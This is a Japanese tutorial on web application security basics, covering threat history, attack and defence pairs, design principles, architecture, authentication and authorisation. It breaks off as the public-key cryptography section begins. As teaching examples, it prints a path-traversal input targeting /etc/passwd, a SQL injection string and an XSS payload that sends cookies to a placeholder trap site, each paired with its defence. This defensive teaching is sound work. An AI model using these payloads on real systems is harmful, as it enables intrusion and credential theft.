# Webアプリケーションセキュリティの基本

---

## 目次

1. [Webアプリケーションセキュリティの変遷](#1-webアプリケーションセキュリティの変遷)
   - 1.1 [1990年代：静的Web時代](#11-1990年代静的web時代)
   - 1.2 [2000年代前半：動的Webの台頭](#12-2000年代前半動的webの台頭)
   - 1.3 [2000年代後半〜2010年代：アプリケーション時代](#13-2000年代後半2010年代アプリケーション時代)
   - 1.4 [2010年代後半〜2020年代：クラウド・API時代](#14-2010年代後半2020年代クラウドapi時代)
   - 1.5 [2020年代以降：AI・ゼロトラスト時代](#15-2020年代以降aiゼロトラスト時代)
2. [各時代の主な脅威と防御の具体例](#2-各時代の主な脅威と防御の具体例)
   - 2.1 [1990年代：ディレクトリトラバーサル](#21-1990年代ディレクトリトラバーサル)
   - 2.2 [2000年代：SQLインジェクション](#22-2000年代sqlインジェクション)
   - 2.3 [2010年代：XSS・CSRF](#23-2010年代xsscsrf)
   - 2.4 [2020年代：API BOLA（オブジェクトレベル認可の欠如）](#24-2020年代api-bolaオブジェクトレベル認可の欠如)
3. [セキュリティ設計の5原則](#3-セキュリティ設計の5原則)
   - 3.1 [最小権限（Least Privilege）](#31-最小権限least-privilege)
   - 3.2 [多層防御（Defense in Depth）](#32-多層防御defense-in-depth)
   - 3.3 [フェイルセキュア（Fail Secure）](#33-フェイルセキュアfail-secure)
   - 3.4 [セキュアデフォルト（Secure Defaults）](#34-セキュアデフォルトsecure-defaults)
   - 3.5 [オープン設計（Open Design）](#35-オープン設計open-design)
4. [セキュアアーキテクチャ設計](#4-セキュアアーキテクチャ設計)
   - 4.1 [レイヤード構造](#41-レイヤード構造)
   - 4.2 [ゼロトラストモデル](#42-ゼロトラストモデル)
   - 4.3 [通信保護とWAF](#43-通信保護とwaf)
   - 4.4 [ネットワーク分離とセグメンテーション](#44-ネットワーク分離とセグメンテーション)
   - 4.5 [一般構成 vs セキュア構成の比較](#45-一般構成-vs-セキュア構成の比較)
5. [認証と認可](#5-認証と認可)
   - 5.0 [認証とは？認可とは？](#50-認証とは認可とは)
   - 5.1 [認証設計：IdPへの委譲](#51-認証設計自前管理をやめてidpに委譲する)
   - 5.2 [認可設計：サーバー側での権限確認](#52-認可設計何ができるかはサーバー側で必ず確認する)
   - [付録A：主要IdaaS 比較表](#付録a主要idaas-比較表)
   - [付録B：SAML とは](#付録bsamlsecurity-assertion-markup-languageとは)
6. [証明書の基礎：公開鍵暗号の仕組み](#6-証明書の基礎公開鍵暗号の仕組み)
   - 6.1 [TLS/SSL証明書（HTTPS通信の基盤）](#61-tlsssl証明書https通信の基盤)
   - 6.2 [クライアント証明書（デバイス・ユーザー認証）](#62-クライアント証明書デバイスユーザー認証)
   - 6.3 [多層防御の仕組み](#63-多層防御の仕組み)
   - 6.4 [クライアント証明書は認証を兼ねる](#64-クライアント証明書は認証を兼ねる)
   - 6.5 [整理：3つの要素が「何を守っているか」](#65-整理3つの要素が何を守っているか)
7. [ハンドシェイクとは](#7-ハンドシェイクとは)
   - 7.1 [TLSハンドシェイクの流れ](#71-tlsハンドシェイクの流れ)
   - 7.2 [認証・認可との関係における位置づけ](#72-認証認可との関係における位置づけ)

---

## 1. Webアプリケーションセキュリティの変遷

### 1.1 1990年代：静的Web時代

インターネット黎明期のWebはHTMLの静的ページが中心で、セキュリティへの意識は非常に低い時代でした。1994年にNetscapeがHTTPS（SSL）を導入したものの、パスワードの平文保存が一般的で、ディレクトリトラバーサルや基本的なインジェクション攻撃が主な脅威でした。対策はネットワークファイアウォールや.htaccessによる基本認証にとどまり、アプリケーション層のセキュリティ対策はほぼ存在しませんでした。

---

### 1.2 2000年代前半：動的Webの台頭

CGIやPHPによるサーバサイドスクリプト、JavaScriptによるインタラクティブなUIが普及し、Webは急速に複雑化しました。それに伴い、SQLインジェクション（1998年頃）、XSS（クロスサイトスクリプティング）、セッションハイジャッキングといった深刻な脅威が現れます。この時代の重要なマイルストーンとして、2001年のOWASP設立と2003年のOWASP Top 10初版の公開が挙げられます。入力検証やエスケープ処理といったセキュアコーディングの概念が生まれ、WAF（Webアプリケーションファイアウォール）も初めて登場しました。

---

### 1.3 2000年代後半〜2010年代：アプリケーション時代

AJAXやSPAフレームワーク（Angular・React）、REST APIの普及により、Webはよりリッチで複雑なアプリケーションへと進化しました。脅威もCSRF、XML外部エンティティ攻撃、モバイル連携によるAPI攻撃面の拡大と多様化します。対策面ではOWASP Top 10の継続的な更新、Secure/HttpOnlyクッキーによるセッション管理強化、CSP・HSTSヘッダの導入、ペネトレーションテストの標準化が進みました。TLSも1.0から1.2へと移行し、通信の安全性が高まりました。

---

### 1.4 2010年代後半〜2020年代：クラウド・API時代

マイクロサービス、コンテナ（Docker/Kubernetes）、サーバレスアーキテクチャの普及により、システムの分散化が進みました。OAuth2やJWTを用いたAPI認証が標準化される一方、API脆弱性（Broken Object Level Authorization）やサプライチェーン攻撃（Log4Shell：2021年）、ランサムウェアが主要脅威として台頭します。これに対してDevSecOps（開発プロセスへのセキュリティ組み込み）、ゼロトラストアーキテクチャ、WAAP（WebアプリケーションとAPIの統合保護）といった包括的なアプローチが広まりました。

---

### 1.5 2020年代以降：AI・ゼロトラスト時代

クラウドネイティブやLLM統合アプリが当たり前になった現在、攻撃側もAIを活用し、フィッシングの高度化や自動化されたエクスプロイトが急増しています（2025年時点でAIを活用した攻撃の成功率は72%超とも報告されています）。防御側も同様にAI・ML技術を取り入れた脅威インテリジェンスや攻撃を予測するプリエンプティブ防御へとシフトしており、量子耐性暗号の検討も始まっています。

---

### まとめ

| 時代 | 技術 | 主な脅威 | 主な対策 |
|------|------|----------|----------|
| 1990年代 | 静的HTML | ディレクトリトラバーサル | ファイアウォール |
| 2000年代前半 | CGI/PHP/JS | SQLi・XSS | OWASP・WAF |
| 2000年代後半〜 | AJAX・SPA・API | CSRF・API攻撃 | CSP・ペンテスト |
| 2010年代後半〜 | クラウド・コンテナ | サプライチェーン攻撃 | DevSecOps・ゼロトラスト |
| 2020年代〜 | AI・クラウドネイティブ | AI活用攻撃 | AI防御・プリエンプティブ対策 |

技術の進化が「静的→動的→分散型」へと攻撃面を拡大させてきた一方、対策も「ファイアウォール中心→アプリ内制御→自動化・予測型防御」へと進化し続けています。


---

<br>
<br>

## 2. 各時代の主な脅威と防御の具体例

---

### 2.1 1990年代：ディレクトリトラバーサル

#### 攻撃とは？
Webサーバーはファイルをパスで管理しています。`../` という記法は「一つ上のフォルダに移動する」という意味で、これを悪用してURLに `../../../etc/passwd` のように繰り返し入力することで、公開するつもりのない場所（OSのパスワードファイルなど）まで遡って覗き見ることができます。

```
本来アクセスできる場所:  /var/www/html/files/report.pdf
攻撃者が狙う場所:        /var/www/html/files/../../../etc/passwd
                                              ↑ここで3階層上に遡る
```

#### 防御：入力サニタイズ
受け取ったパスに `../` が含まれていれば、処理する前に除去・拒否します。

```
ユーザー入力
    ↓
"../" を含む？ → YES → 即リジェクト ❌
    ↓ NO
安全なパスとして処理 → ファイルを返す ✅
```

---



### 2.2 2000年代：SQLインジェクション

#### 攻撃とは？
ログインフォームなどのユーザー入力が、そのままデータベースへの命令文（SQL）に組み込まれる実装になっている場合、攻撃者は入力欄に `' OR '1'='1` のような文字列を仕込むことで、SQL文の意味を書き換えることができます。

```
【開発者が意図したSQL】
SELECT * FROM users WHERE id = '入力値'

【攻撃者が ' OR '1'='1 を入力した場合】
SELECT * FROM users WHERE id = '' OR '1'='1'
                                    ↑ 常にTRUEになる条件を追加
→ 全ユーザーのデータが返ってしまう ❌
```

#### 防御：プリペアドステートメント
SQLの「構造」を先に確定させ、ユーザー入力は「値」としてのみ扱うことで、命令文として解釈されないようにします。

```
SQL: SELECT * FROM users WHERE id = ?  ← 構造を先に固定
                                    ↑
             ユーザー入力はここに「値」として埋め込まれる
             → どんな文字列が来ても命令として実行されない ✅
```

---



### 2.3 2010年代：XSS・CSRF

#### XSSとは？
掲示板やコメント欄などの入力内容をそのまま画面に表示するWebサイトに対し、`<script>悪意あるコード</script>` を投稿することで、そのページを閲覧した別のユーザーのブラウザ上でスクリプトを実行させる攻撃です。Cookie（ログイン情報）の盗難などに悪用されます。

```
攻撃者が投稿: <script>document.location='罠サイト?c='+document.cookie</script>
                                                              ↑ログイン情報を送信
被害者が閲覧 → ブラウザがそのままスクリプトを実行 ❌
```

#### 防御：出力エンコード
HTMLとして特別な意味を持つ文字を、無害な文字列に変換してから表示します。

```
入力: <script>...</script>
         ↓ エンコード処理
表示: &lt;script&gt;...&lt;/script&gt;
     → ブラウザが「文字列」として表示するだけで実行しない ✅
```

---

#### CSRFとは？
ログイン中のユーザーを罠サイトへ誘導し、本人が気づかないうちに正規サイトへのリクエスト（送金・パスワード変更など）を勝手に送信させる攻撃です。ブラウザはログイン中のCookieを自動送信するため、サーバー側では正規ユーザーからのリクエストと区別できません。

```
① ユーザーが銀行サイトにログイン中
② 攻撃者の罠サイトを開く
③ 罠サイトが裏で銀行サイトへリクエストを送信
   POST /transfer?to=攻撃者&amount=100000
④ ブラウザが自動でCookieを付与 → 銀行サーバーは正規リクエストと判断 ❌
```

#### 防御：CSRFトークン
サーバーが発行したランダムな文字列（トークン）をフォームに埋め込み、送信時に照合します。罠サイトはこのトークンを知ることができないため、偽のリクエストを弾くことができます。

```
① サーバーがトークン発行（例: "x7k2p"）→ フォームの隠し項目に埋め込み
② ユーザーが送信 → トークンも一緒に送られる
③ サーバーが照合:
   一致 → 正規リクエストとして処理 ✅
   不一致 or なし → 罠サイトからの偽リクエストとして拒否 ❌
```

---



### 2.4 2020年代：API BOLA（オブジェクトレベル認可の欠如）

#### 攻撃とは？
APIはURLにリソースのIDを含む設計が一般的です（例：`/api/users/123`）。サーバーが「ログインしているかどうか」しか確認せず、「そのリソースが自分のものかどうか」を確認していない場合、IDを書き換えるだけで他人のデータに自由にアクセスできてしまいます。

```
正規のリクエスト: GET /api/users/456  ← 自分（user_id: 456）のデータ ✅
攻撃者の操作:    GET /api/users/123  ← 他人（user_id: 123）のデータ
                              ↑ IDを書き換えるだけ
→ 認証（ログイン確認）は通るが、認可（権限確認）が抜けている ❌
```

#### 防御：オブジェクトレベルの認可チェック
リクエストされたリソースのオーナーと、リクエストしたユーザーが一致するかをAPI処理の中で必ず確認します。

```
リクエスト: GET /api/users/123
    ↓
JWTから「リクエストしたユーザーID」を取得 → 456
リソース（user 123）の「オーナーID」を確認 → 123
    ↓
456 ＝ 123？
NO → アクセス拒否 ❌（他人のデータは見せない）
YES → データを返す ✅
```

---



### まとめ：防御の本質

- どの攻撃にも共通するのは、**「信頼すべきでない入力やリクエストを、検証せずに処理してしまう」** という根本的な問題です。
- 攻撃の定義を理解した上で「どの段階で・何を・どう検証するか」を設計することが、セキュリティ対策の出発点になります。


---

<br>
<br>

## 3. セキュリティ設計の5原則

「安全なシステム」は後付けの対策だけでは実現できません。設計の段階から組み込むべき考え方が5つあります。

---

### 3.1 最小権限（Least Privilege）

#### 考え方
ユーザーやシステムには、**その業務に必要な最小限の権限だけを与える**という原則です。「使わないかもしれないから念のため広めに」は禁物です。

#### 具体例
```
❌ 悪い例: アプリがデータベースに接続する際、管理者権限を使う
           → アプリが乗っ取られると、DB全体を削除・改ざん可能

✅ 良い例: アプリに「読み取り専用」権限だけを付与する
           → 乗っ取られても、データを盗まれる被害にとどまる
```

#### 守らなかった実例
2021年のColonial Pipeline攻撃では、権限管理の甘さがランサムウェアの被害を拡大させ、米国東海岸の燃料供給が数日にわたって停止しました。

---



### 3.2 多層防御（Defense in Depth）

#### 考え方
セキュリティを「一枚の壁」で守ろうとするのではなく、**複数の独立した防御層を重ねる**という原則です。1層が突破されることを前提に設計します。

#### 具体例
```
攻撃者
  ↓
【第1層】 WAF（不正リクエストをブロック）
  ↓ 突破されたとしても…
【第2層】 アプリの入力検証（不正データを拒否）
  ↓ 突破されたとしても…
【第3層】 DBのアクセス制御（権限外の操作を拒否）
  ↓ 突破されたとしても…
【第4層】 ログ・監視（異常を検知してアラート）
```

#### 守らなかった実例
2017年のEquifax情報漏洩では、WAFの設定ミスという単一障害が原因で、1億4千万人分の個人情報が流出しました。多層で守られていれば被害は防げた可能性があります。

---



### 3.3 フェイルセキュア（Fail Secure）

#### 考え方
エラーや予期しない障害が発生したとき、**「失敗した場合は拒否する」をデフォルトにする**という原則です。また、エラーメッセージに内部情報を含めないことも重要です。

#### 具体例
```
❌ 悪い例（失敗時に情報を漏らす）
   ログイン失敗 → 「そのメールアドレスは登録されていません」
                    ↑ 攻撃者が「有効なアカウント」を特定するヒントになる

✅ 良い例（失敗時に何も教えない）
   ログイン失敗 → 「メールアドレスまたはパスワードが正しくありません」
                    ↑ 有効かどうかを判断できない

❌ 悪い例（エラーに内部情報を含める）
   エラー発生 → スタックトレース（エラーの詳細）をそのままブラウザに表示
                 ↑ SQLのテーブル名・コードの構造が攻撃者に筒抜け
```

---



### 3.4 セキュアデフォルト（Secure Defaults）

#### 考え方
システムの初期設定を「最も安全な状態」にしておくという原則です。**セキュリティを有効にするために設定変更が必要、ではなく、無効にするために設定変更が必要**という設計にします。

#### 具体例
```
❌ 悪い例: デフォルトでHTTP（暗号化なし）で動作する
           → 設定を知らない管理者が放置すると、通信が丸見えになる

✅ 良い例: デフォルトでHSTSを有効化（HTTPS強制）
           → 何もしなくても安全な通信が保証される
```

#### 守らなかった実例
2023年のMoveItファイル転送ツールの被害では、デフォルト設定の脆弱性を突かれ、数百万件の個人情報が流出しました。

---



### 3.5 オープン設計（Open Design）

#### 考え方
「仕組みを秘密にすることでセキュリティを保つ」という設計に頼らないという原則です。**暗号化アルゴリズムなどは公開・検証済みの標準規格を使う**ことで、より堅牢な安全性を実現します。

#### 具体例
```
❌ 悪い例: 自社オリジナルの暗号方式を使う
           → 公開検証を経ていないため、見落とした欠陥を突かれやすい
           → 設計者が退職・情報漏洩すると全て無効化される

✅ 良い例: OpenSSL、OAuth2などの公開・標準化された仕組みを使う
           → 世界中の専門家が検証・改善し続けているため、信頼性が高い
```

---



### まとめ

| 原則 | 一言で言うと | 守らないとどうなるか |
|------|------------|-------------------|
| 最小権限 | 必要なものだけ渡す | 侵害が全体に波及する |
| 多層防御 | 一枚の壁に頼らない | 1箇所の突破で全滅する |
| フェイルセキュア | 失敗時は閉じる | エラーが攻撃の手がかりになる |
| セキュアデフォルト | 最初から安全にしておく | 設定ミスが即脆弱性になる |
| オープン設計 | 秘密主義に頼らない | 独自実装が簡単に破られる |

これら5つの原則は独立したものではなく、組み合わせて実践することで初めて「設計レベルで安全なシステム」が実現します。


---

<br>
<br>

## 4. セキュアアーキテクチャ設計

---

### 4.1 レイヤード構造

フロントエンド・バックエンド・データ・インフラを論理的・物理的に分離します。1つの層が侵害されても、他の層への影響を最小限に抑えることが目的です。各層ではそれぞれ独立した認証・検証を行います。

```mermaid
flowchart LR
    User["👤 ユーザー"]

    subgraph Front["第1層：フロントエンド"]
        SPA["SPA（React）"]
    end

    subgraph Gateway["第2層：ゲートウェイ"]
        AG["API Gateway（App Gateway + WAF）"]
    end

    subgraph Back["第3層：バックエンド"]
        MS1["マイクロサービスA（認証）"]
        MS2["マイクロサービスB（ビジネスロジック）"]
        MS3["マイクロサービスC（ファイル処理）"]
    end

    subgraph Data["第4層：データ"]
        DB["DB（Private）"]
        Cache["キャッシュ"]
        Storage["ストレージ"]
    end

    User -->|"HTTPS"| SPA
    SPA -->|"HTTPS + 認証トークン"| AG
    AG -->|"検証済みリクエストのみ通過"| MS1
    AG -->|"検証済みリクエストのみ通過"| MS2
    AG -->|"検証済みリクエストのみ通過"| MS3
    MS1 & MS2 & MS3 -->|"Private接続のみ"| DB
    MS2 --> Cache
    MS3 --> Storage
```

> 各層の間に検証ポイントを設けることで、1層突破が即全体の崩壊につながらない構造を実現します。

---



### 4.2 ゼロトラストモデル

「社内ネットワークだから安全」「認証済みだから信頼する」という前提を排除し、**すべての通信を毎回検証する**モデルです。
内部サービス間の通信であっても例外はありません。

```mermaid
flowchart LR
    User["👤 ユーザー"]

    subgraph ZT["ゼロトラスト検証"]
        direction TB
        MFA["① MFA認証"]
        Token["② JWTトークン発行"]
        Policy["③ アクセスポリシー確認（役割・デバイス・場所）"]
    end

    subgraph Services["サービス群"]
        direction TB
        SvcA["サービスA"]
        SvcB["サービスB"]
        DB["DB"]
    end

    User --> MFA --> Token --> Policy
    Policy -->|"許可された場合のみ"| SvcA
    Policy -->|"許可された場合のみ"| SvcB
    SvcA -->|"再検証"| SvcB
    SvcB -->|"再検証"| DB

    style ZT fill:#fff3cd,stroke:#ffc107
```

> サービスAが侵害されても、そこからDBへ直接アクセスすることはできません。横方向への侵害拡大（ラテラルムーブメント）を防ぎます。

---



### 4.3 通信保護とWAF

外部からの通信はすべてWAFで検査し、内部通信はTLS暗号化を徹底します。公開するエンドポイントを最小限に絞ることも重要です。

```mermaid
flowchart LR
    Internet["🌐 インターネット"]

    subgraph Edge["エッジ保護"]
        WAF["WAF・SQLi検知・XSS検知・OWASP CRSルール"]
        TLS["TLS終端（HTTPS強制・HSTSヘッダ）"]
    end

    subgraph Internal["内部通信（非公開）"]
        App["アプリサーバー"]
        DB["DBPrivate Endpointのみ"]
    end

    Blocked["❌ 不正リクエストブロック"]

    Internet -->|"HTTPS"| WAF
    WAF -->|"検知した場合"| Blocked
    WAF -->|"正常な場合"| TLS
    TLS -->|"暗号化通信"| App
    App -->|"Private接続のみ"| DB

    style Blocked fill:#f8d7da,stroke:#dc3545,color:#000
    style Edge fill:#d1ecf1,stroke:#17a2b8,color:#000
```

---



### 4.4 ネットワーク分離とセグメンテーション

ネットワークをサブネット（区画）に分割し、区画間の通信を厳密に制御します。侵害が発生した場合でも、該当区画だけを隔離することで被害を封じ込めます。

```mermaid
flowchart LR
    Internet["🌐 インターネット"]

    subgraph VNet["仮想ネットワーク（VNet）"]

        subgraph PublicSubnet["パブリックサブネット（外部公開あり）"]
            WAF["WAF / ロードバランサー"]
            Web["Webサーバー"]
        end

        subgraph PrivateSubnet["プライベートサブネット（外部公開なし）"]
            API["APIサーバー"]
            DB["DB（内部アクセスのみ）"]
        end

        NSG["NSG（ネットワークセキュリティグループ）・DBへの直接アクセスを拒否・APIへはWebサーバーからのみ許可"]
    end

    Internet --> WAF --> Web
    Web -->|"NSGで制御"| API
    API -->|"NSGで制御"| DB
    NSG -.->|"監視・制御"| PrivateSubnet

    style PublicSubnet fill:#fff3cd,stroke:#ffc107,color:#000
    style PrivateSubnet fill:#d4edda,stroke:#28a745,color:#000
```

---



### 4.5 一般構成 vs セキュア構成の比較

```mermaid
flowchart LR
    subgraph Insecure["❌ 一般的な構成（危険）"]
        direction LR
        U1["ユーザー"]
        App1["Appサーバー（直接公開）"]
        DB1["DB（パブリック接続）"]
        Log1["アプリログのみ"]

        U1 -->|"HTTP可"| App1
        App1 -->|"平文・信頼前提"| DB1
    end

    subgraph Secure["✅ セキュアな構成"]
        direction LR
        U2["ユーザー"]
        GW["WAF＋API Gateway"]
        App2["Appサーバー（非公開）"]
        DB2["DB（Private接続のみ）"]
        Monitor["統合監視（ログ＋異常検知）"]

        U2 -->|"HTTPS強制"| GW
        GW -->|"JWT認証済みのみ"| App2
        App2 -->|"Private Endpoint"| DB2
        App2 & DB2 --> Monitor
    end

    style Insecure fill:#f8d7da,stroke:#dc3545,color:#000
    style Secure fill:#d4edda,stroke:#28a745,color:#000
```

---



### まとめ

これら4つの設計アプローチは、それぞれ独立して機能しますが、組み合わせることで真に堅牢なアーキテクチャになります。

| 設計アプローチ | 守るもの | 侵害時の効果 |
|--------------|---------|------------|
| レイヤード構造 | 層をまたいだ侵害拡大 | 被害を1層内に封じ込める |
| ゼロトラスト | 横方向への侵害拡大 | サービス間の不正移動を防ぐ |
| WAF・TLS | 外部からの攻撃通信 | 既知の攻撃パターンを入口で遮断 |
| ネットワーク分離 | 区画をまたいだアクセス | 侵害区画だけを即座に隔離できる |


---

<br>
<br>

## 5. 認証と認可

### 5.0 認証とは？認可とは？

まず2つの概念を整理します。混同されがちですが、役割が全く異なります。

```mermaid
flowchart LR
    User["👤 ユーザー"]
    
    AuthN["認証（Authentication）「あなたは誰ですか？」本人確認"]
    AuthZ["認可（Authorization）「何をしてよいですか？」権限確認"]
    
    Resource["🗂️ リソース"]
    DenyAuthN["❌ 401 Unauthorized認証失敗（本人確認できず）"]
    DenyAuthZ["❌ 403 Forbidden認可失敗（権限なし）"]

    User -->|"ID・パスワード・MFAなど"| AuthN
    AuthN -->|"本人確認OK → トークン発行"| AuthZ
    AuthN -->|"本人確認NG"| DenyAuthN
    AuthZ -->|"権限あり → アクセス許可"| Resource
    AuthZ -->|"権限なし"| DenyAuthZ

    style AuthN fill:#d1ecf1,stroke:#17a2b8,color:#000
    style AuthZ fill:#d4edda,stroke:#28a745,color:#000
    style DenyAuthN fill:#f8d7da,stroke:#dc3545,color:#000
    style DenyAuthZ fill:#f8d7da,stroke:#dc3545,color:#000
```
---



### 5.1 認証設計：自前管理をやめてIdPに委譲する

#### 考え方
パスワードの保管・MFAの実装・ブルートフォース対策などを自前で実装するのは、コストが高く脆弱性を生みやすいです。OAuth2/OpenID Connect（OIDC）を基盤に、実績あるIdP（Identity Provider）に認証を委譲するのが現代のベストプラクティスです。

#### 認証フロー

```mermaid
sequenceDiagram
    actor User as 👤 ユーザー
    participant Client as Webアプリ
    participant IdP as IdP（Entra IDなど）
    participant API as APIサーバー
    participant Log as 監視ログ

    User->>Client: ① ログインボタンをクリック
    Client->>IdP: ② 認証リクエスト（OAuth2 + PKCE）
    IdP->>User: ③ ログイン画面・MFA要求
    User->>IdP: ④ 認証情報 + MFAコード入力
    IdP->>Client: ⑤ JWTトークン発行
    Client->>API: ⑥ APIリクエスト（Authorizationヘッダ付き）
    API->>API: ⑦ トークン検証・権限チェック
    API->>Client: ⑧ レスポンス
    IdP->>Log: ⑨ 全認証イベントをログ記録
```

#### 自前実装 vs IdP委譲の比較

| 項目 | 自前認証 | IdP委譲（推奨） |
|------|---------|--------------|
| MFA対応 | 自分で実装が必要 | 標準サポート |
| ブルートフォース対策 | 自分で実装が必要 | IdP側で自動対処 |
| ログ・監視 | 自前で構築 | 統合監視に直結 |
| スケーラビリティ | セッション管理が複雑 | ステートレスなJWTで容易 |
| 侵害時の対応 | 自前でトークン無効化 | IdP側で一括無効化 |

---

### 付録A：主要IdaaS 比較表

| | **Microsoft Entra ID** | **Okta** | **Auth0** | **AWS Cognito** | **Firebase Authentication** |
|---|---|---|---|---|---|
| **提供元** | Microsoft | Okta | Okta（旧独立）| Amazon | Google |
| **主な用途** | 社員・従業員向け（B2E）| 社員・従業員向け（B2E）| アプリユーザー向け（B2C/B2B SaaS）| アプリユーザー向け（B2C）| モバイル・Webアプリ向け（B2C）|
| **得意な環境** | Microsoft 365 / Azure環境 | マルチクラウド・マルチベンダー環境 | 開発者主導のSaaSアプリ | AWS環境 | Firebase / GCP環境 |
| **導入コスト** | Microsoft 365ライセンスに含まれる場合あり・比較的低コスト | 高め（ユーザー単位課金）| 無料枠あり・スケールで高くなる | 安価（月50,000MAUまで無料）| 無料枠が広い |
| **✅ Pros** | ・M365との統合が完結・追加コスト不要なケースが多い・条件付きアクセス（ABAC）が強力・ハイブリッド環境（AD連携）に強い | ・ベンダー中立でどの環境にも対応・7,000以上のアプリ連携カタログ・UIが直感的で管理しやすい | ・開発者フレンドリーなSDK・API・ソーシャルログイン・カスタマイズが容易・B2C向けブランディングに対応 | ・AWSサービスとのネイティブ統合・低コストで大規模ユーザーに対応・サーバーレス構成と相性が良い | ・導入が非常に簡単・無料枠が広くスタートアップ向き・Google/Apple/SNSログインがすぐ使える |
| **❌ Cons** | ・Microsoft以外の環境では設定が複雑になる・UIが非技術者には分かりにくい | ・コストが高く、中小企業には重い・高度な機能は追加費用が必要 | ・大規模になるとコストが急増・ユーザー自身によるセルフサービスが限定的 | ・高度なエンタープライズ機能（SAML連携など）が弱い・UIが開発者向けで運用担当者には難しい | ・エンタープライズ向け機能（監査・ガバナンス）が不足・Google依存が強い |
| **向いている組織** | Microsoft環境を使う中〜大規模企業 | 複数クラウドを使う大規模エンタープライズ | 開発者主導のSaaS・スタートアップ | AWSを主軸にするチーム・スタートアップ | Firebase利用中のモバイルアプリ・個人開発 |

---

#### 選び方のポイント

既存の環境と用途を軸に選ぶのが最も合理的です。

- **すでにMicrosoft 365を使っている** → Entra ID一択
- **AWS環境でコストを抑えたい** → Cognito
- **マルチクラウドで本格的なエンタープライズIAMが必要** → Okta
- **開発者がゼロから認証を作りたい / B2Cアプリ** → Auth0
- **スモールスタートで素早く実装したい** → Firebase Authentication

> いずれのサービスもOAuth2/OIDCに準拠しており、後から乗り換えること自体は技術的に可能です。ただし移行コストは発生するため、最初の選定が重要です。



### 付録B：SAML（Security Assertion Markup Language）とは

#### OAuth2/OIDCとの違い

現代のWebアプリでよく使われるOAuth2/OIDCと混同されやすいですが、生まれた背景と得意な用途が異なります。

| | **SAML** | **OAuth2 / OIDC** |
|---|---|---|
| **登場年** | 2002年 | 2012年（OAuth2）/ 2014年（OIDC）|
| **主な用途** | 企業の社内システム間SSO | WebアプリやAPIの認証・認可 |
| **データ形式** | XML | JSON / JWT |
| **得意な環境** | オンプレミス・レガシーな企業システム | モバイル・クラウドネイティブアプリ |
| **設定の複雑さ** | 高い（XML証明書の管理が必要）| 比較的シンプル |
| **向いているもの** | Salesforce・SAP・社内ポータルとのSSO | Google・GitHub・SNSログインなど |

---

#### SAMLの仕組み

```mermaid
sequenceDiagram
    actor User as 👤 ユーザー
    participant SP as サービスプロバイダー（SP）例：Salesforce
    participant IdP as IDプロバイダー（IdP）例：Entra ID

    User->>SP: ① Salesforceにアクセス
    SP->>User: ② 「まずIdPで認証してください」→ IdPへリダイレクト
    User->>IdP: ③ 社内IdPでログイン（MFAなど）
    IdP->>SP: ④ SAMLアサーション（XML）を送信「この人は認証済みです」
    SP->>User: ⑤ アクセス許可
```

> SAMLアサーションとは「この人は誰で、どんな権限を持ち、いつ認証されたか」をXML形式で記述した証明書のようなものです。

---

#### いつSAMLを選ぶべきか

```mermaid
flowchart TD
    Q1{"接続先は何？"}
    Q1 -->|"SalesforceやSAPなどレガシー企業システム"| SAML["SAMLを選ぶ"]
    Q1 -->|"モバイルアプリやクラウドネイティブ"| OIDC["OAuth2/OIDCを選ぶ"]
    
    Q2{"既存のIT環境は？"}
    SAML --> Q2
    Q2 -->|"オンプレActive Directoryが中心"| EntraID["Entra IDでSAML連携"]
    Q2 -->|"クラウド中心"| Okta["OktaなどでSAML+OIDC併用"]

    style SAML fill:#fff3cd,stroke:#ffc107,color:#000
    style OIDC fill:#d4edda,stroke:#28a745,color:#000
```

---

#### まとめ

SAMLは「古い規格だから使わない」ではなく、**エンタープライズの既存システムとのSSO統合では今も現役の標準規格**です。新規開発ではOIDCを選びつつ、既存の社内システム連携が必要な場面でSAMLを併用するケースが実務では最も多い構成です。


---


### 5.2 認可設計：「何ができるか」はサーバー側で必ず確認する

#### 考え方
認可（権限チェック）はサーバー側で行うことが絶対条件です。フロントエンドだけで「管理者メニューを非表示にする」といった制御は、開発者ツールで簡単に書き換えられてしまいます。

```mermaid
flowchart TB
    subgraph NG["❌ フロントのみの制御（危険）"]
        direction LR
        F1["フロントで管理者ボタンを非表示"]
        Hack["攻撃者がDevToolsでHTMLを書き換え"]
        F2["管理者APIに直接アクセス成功"]
        F1 --> Hack --> F2
    end

    subgraph OK["✅ サーバー側での制御（正しい）"]
        direction LR
        S1["フロントで管理者ボタンを非表示（UIのみ）"]
        S2["APIサーバーで権限チェック"]
        S3["権限なし → 403拒否権限あり → 処理実行"]
        S1 --> S2 --> S3
    end

    style NG fill:#f8d7da,stroke:#dc3545,color:#000
    style OK fill:#d4edda,stroke:#28a745,color:#000
```

#### RBACとABACの使い分け

| | RBAC（ロールベース） | ABAC（属性ベース） |
|---|---|---|
| **制御の基準** | ユーザーの「役割」で判断 | 役割に加え、場所・時間・デバイスなど複数の「属性」で判断 |
| **具体例** | `admin`は全操作可、`user`は閲覧のみ | 日本国内・社内デバイス・営業時間内の場合のみ承認 |
| **✅ Pros** | シンプルで管理しやすい／導入コストが低い／監査しやすい | きめ細かい制御が可能／条件の組み合わせで柔軟に対応できる |
| **❌ Cons** | 条件が複雑になるとロールが爆発的に増える／状況に応じた動的制御が苦手 | 設計・管理が複雑／条件が増えるほどデバッグが難しくなる |
| **向いている場面** | 社内システム・管理画面など役割が明確なシステム | グローバルサービス・ゼロトラスト環境など状況に応じた制御が必要なシステム |

一般的には**まずRBACで設計し、より細かい制御が必要な箇所にABACを組み合わせる**のが現実的なアプローチです。---



### まとめ

```mermaid
flowchart LR
    subgraph Auth["認証（Authentication）"]
        A1["IdPへ委譲（自前管理しない）"]
        A2["MFA必須化"]
        A3["JWTでステートレス管理"]
    end

    subgraph Authz["認可（Authorization）"]
        B1["サーバー側で必ず検証（フロントのみはNG）"]
        B2["RBAC：役割ベースの制御"]
        B3["ABAC：属性ベースの動的制御"]
    end

    subgraph Monitor["監視"]
        C1["全認証イベントをログ記録"]
        C2["異常検知・アラート"]
    end

    Auth --> Authz --> Monitor
```

| 設計ポイント | やること | やってはいけないこと |
|------------|---------|-----------------|
| 認証 | IdP（OAuth2/OIDC）に委譲 | パスワードを自前で保管・管理 |
| MFA | 高リスク時は必須化 | パスワードのみで認証を完結させる |
| 認可 | サーバー側でロール・属性を検証 | フロントエンドの表示制御だけに頼る |
| 監視 | 全認証イベントをログに記録 | エラー時だけログを取る |


---

<br>
<br>

## 6. 証明書の基礎：公開鍵暗号の仕組み

証明書を理解するには、まず前提となる「公開鍵暗号」を押さえる必要があります。

```mermaid
flowchart LR
    subgraph KeyPair["鍵ペア（セットで生成）"]
        Pub["🔓 公開鍵誰にでも配布してよい"]
